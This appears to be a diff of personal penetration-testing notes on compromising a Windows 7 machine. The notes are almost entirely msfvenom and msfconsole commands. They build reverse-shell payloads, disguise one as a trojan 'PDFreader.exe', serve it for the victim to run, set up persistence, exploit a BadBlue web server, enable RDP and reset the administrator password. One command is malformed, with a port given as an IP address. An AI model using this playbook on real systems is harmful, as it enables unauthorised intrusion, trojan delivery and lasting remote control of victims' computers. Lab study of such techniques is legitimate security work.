@@ -1,16 +1,14 @@
-
 ---Hacking into windows 7 system---
-
-
 
 
 --Hacking windows 7 with & without trojan with msfconsole--
 
+
 > apt install metasploit-framework
 > msfvenom -l payloads                                    (choose a payload)
 > msfvenom --list formats                                 (choose a format accordingly)
-> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=local_ip Lport=4444 -f exe > /root/Downloads/shell_reverse.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as )
-> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=local_ip Lport=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
+> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=192.168.0.4 Lport=4444 -f exe > /root/Downloads/shell_reverse.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as )
+> msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=192.168.0.4 Lport=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
 > hexdump -C shell_reverse.exe | less                     ( check the exe file, 4d 5a - MZ represents its a exe file)
 > python3 -m http.server (to download the exe file over web on victim machine) - let it run
 > install shell_reverse.exe file from web on victim machine
@@ -28,11 +26,11 @@
 
 
 
-
 --Hacking windows 7 with & without trojan with nc--
 
-> msfvenom - windows/shell_reverse_tcp LHOST=local_ip LPORT=port -f exe -o inject.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as ) -- without trojan
-> > msfvenom -p windows/shell_reverse_tcp LHOST=local_ip LPORT=port -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
+
+> msfvenom - windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=192.168.1.1 -f exe -o inject.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as ) -- without trojan
+> > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f exe -x /root/Downloads/the_application_or_service_needed_by_victim.exe -o PDFreader.exe(trojan)
 > hexdump -C inject.exe | less
 > python3 -m http.server
 > install inject.exe file from web on victim machine
@@ -41,7 +39,8 @@
 > now open victim machine and run the inject.exe file
 > check the terminal on attack machine
 
->useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
+
+useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
 
 
 
@@ -55,8 +54,8 @@
 > set PAYLOAD windows/meterpreter/reverse_tcp
 > set LHOST local_ip
 > exploit
-> copy the 'malicious executable at' (\\local_ip\hUoNjR\pdfreader.exe)
-> open target machine and search \\local_ip\hUoNjR\pdfreader.exe on browser
+> copy the 'malicious executable at' (\\192.168.0.6\hUoNjR\pdfreader.exe)
+> open target machine and search \\192.168.0.6\hUoNjR\pdfreader.exe
 > run the service
 > check the terminal in attack machine
 > ctrl c
@@ -97,7 +96,11 @@
 > set lhost local_ip
 > set lport local_port
 > set payload windows/meterpreter/reverse_tcp
-> exploit
+> exploit -j -z
+> ctrl + c
+> sessions
+> sessions -i 1
+
 
 
 
@@ -134,3 +137,32 @@
 > run persistence -U -i 5 -p port -r local_ip 
 > exit
 > exploit (now you can connect to the target machine without running exe file on target machine)
+
+
+
+
+--Hacking windows 7 post exploitation with metasploit and enabling remote desktop--
+
+> nmap target_machine_ip
+> note an open port (lets assume port 80)
+> nmap -sV -p 80 target_machine_ip
+> note the version of the service (BadBlue httpd 2.7)
+> msfconsole
+> search badblue and find the module
+> use exploit/windows/http/badblue_passthru
+> set rhosts target_machine_ip
+> exploit
+> meterpreter> background
+> use post/windows/manage/enable_rdp
+> set SESSION 1(previous session which is in background)
+> show options and notice the LPORT
+> exploit
+> open new terminal and scan for the target again
+> nmap target_machine_ip
+> notice LPORT in show options previously is in open state
+> get back to previous terminal
+> sessions -i 1
+> meterpreter > shell
+> C:\\Windows\system32>net user administrator password
+> open new terminal
+> xfreerdp target_machine_ip (give user and password)
